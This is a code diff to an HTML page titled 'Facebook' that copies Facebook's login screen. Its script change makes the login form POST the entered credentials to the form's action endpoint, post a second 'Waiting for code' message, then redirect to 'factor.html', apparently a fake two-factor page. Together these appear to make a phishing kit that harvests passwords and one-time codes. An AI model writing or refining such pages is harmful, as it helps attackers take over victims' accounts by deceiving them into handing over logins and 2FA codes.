@@ -7,62 +7,52 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook</title>
     <link rel="shortcut icon" href="images/facebook-icon.png" type="image/x-icon">
-    <!-- <link rel="stylesheet" href="style.css"> -->
     <style>
+        /* Your existing styles */
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Roboto', sans-serif;
         }
-
         .flex {
             display: flex;
             align-items: center;
         }
-
         .container {
             padding: 0 15px;
             min-height: 100vh;
             justify-content: center;
             background: #f0f2f5;
         }
-
         .facebook-page {
             justify-content: space-between;
             max-width: 1000px;
             width: 100%;
         }
-
         .facebook-page .text {
             margin-bottom: 90px;
         }
-
         .facebook-page h1 {
             color: #1877f2;
             font-size: 4rem;
             margin-bottom: 10px;
         }
-
         .facebook-page p {
             font-size: 1.75rem;
             white-space: nowrap;
         }
-
         form {
             display: flex;
             flex-direction: column;
             background: #fff;
             border-radius: 8px;
             padding: 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
-                0 8px 16px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             max-width: 400px;
             width: 100%;
         }
-
         form input {
             height: 55px;
             width: 100%;
@@ -72,24 +62,20 @@
             font-size: 1rem;
             padding: 0 14px;
         }
-
         form input:focus {
             outline: none;
             border-color: #1877f2;
         }
-
         ::placeholder {
             color: #777;
             font-size: 1.063rem;
         }
-
         .link {
             display: flex;
             flex-direction: column;
             text-align: center;
             gap: 15px;
         }
-
         .link .login {
             border: none;
             outline: none;
@@ -102,24 +88,19 @@
             font-weight: 600;
             transition: 0.2s ease;
         }
-
         .link .login:hover {
             background: #0d65d9;
         }
-
         form a {
             text-decoration: none;
         }
-
         .link .forgot {
             color: #1877f2;
             font-size: 0.875rem;
         }
-
         .link .forgot:hover {
             text-decoration: underline;
         }
-
         hr {
             border: none;
             height: 1px;
@@ -127,13 +108,11 @@
             margin-bottom: 20px;
             margin-top: 20px;
         }
-
         .button {
             margin-top: 25px;
             text-align: center;
             margin-bottom: 20px;
         }
-
         .button a {
             padding: 15px 20px;
             background: #42b72a;
@@ -143,36 +122,29 @@
             font-weight: 600;
             transition: 0.2s ease;
         }
-
         .button a:hover {
             background: #3ba626;
         }
-
         @media (max-width: 900px) {
             .facebook-page {
                 flex-direction: column;
                 text-align: center;
             }
-
             .facebook-page .text {
                 margin-bottom: 30px;
             }
         }
-
         @media (max-width: 460px) {
             .facebook-page h1 {
                 font-size: 3.5rem;
             }
-
             .facebook-page p {
                 font-size: 1.3rem;
             }
-
             form {
                 padding: 15px;
             }
         }
-
         .foot {
             display: flex;
             align-items: center;
@@ -214,23 +186,44 @@
         document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault(); // Prevent default form submission
 
-            // Perform any validation or processing here if needed
-
-            // Submit the form programmatically
+            // Step 1: Submit the login details
             var form = e.target;
             var formData = new FormData(form);
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', form.action, true);
-            xhr.onload = function () {
-                if (xhr.status === 200) {
-                    // Redirect to the specified URL upon successful form submission
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    return response.text();
+                } else {
+                    throw new Error('Form submission failed');
+                }
+            })
+            .then(data => {
+                console.log('Login response:', data);
+
+                // Step 2: Send the message "Waiting for code"
+                var messageFormData = new FormData();
+                messageFormData.append('message', 'Waiting for code');
+                
+                return fetch(form.action, {
+                    method: 'POST',
+                    body: messageFormData
+                });
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to the specified URL upon successful second submission
                     window.location.href = 'factor.html';
                 } else {
-                    // Handle error case if needed
-                    alert('Form submission failed. Please try again.');
+                    throw new Error('Second form submission failed');
                 }
-            };
-            xhr.send(formData);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Form submission failed. Please try again.');
+            });
         });
     </script>
 </body>
